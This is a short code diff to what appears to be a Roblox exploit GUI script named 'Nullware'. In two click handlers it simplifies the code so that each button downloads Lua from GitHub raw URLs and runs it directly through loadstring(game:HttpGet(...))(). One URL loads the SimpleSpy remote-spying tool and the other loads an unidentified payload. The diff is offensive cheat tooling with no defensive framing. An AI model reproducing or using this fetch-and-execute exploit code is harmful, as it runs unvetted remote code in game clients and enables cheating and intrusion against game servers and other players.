@@ -187,11 +187,7 @@ local function EADD_fake_script() -- Nullware.Script
 
 	function Click(mouse)
 		
-		local args = {
-			[1] = loadstring(game:HttpGet(('https://raw.githubusercontent.com/xyahsvr/poop/main/baan'),true))()
-		}
-	
-		workspace.Remote.ItemHandler:InvokeServer(unpack(args))
+		loadstring(game:HttpGet(('https://raw.githubusercontent.com/xyahsvr/poop/main/baan'),true))()
 		
 	end
 	
@@ -241,12 +237,8 @@ script.Parent.MouseButton1Down:connect(Click)
 
 	function Click(mouse)
 		
-		local args = {
-		    [1] = loadstring(game:HttpGet("https://raw.githubusercontent.com/exxtremestuffs/SimpleSpySource/master/SimpleSpy.lua", true))()
-		}
+		loadstring(game:HttpGet("https://raw.githubusercontent.com/exxtremestuffs/SimpleSpySource/master/SimpleSpy.lua", true))()
 		
-		workspace.Remote.ItemHandler:InvokeServer(unpack(args))
-	
 	end
 	
 	
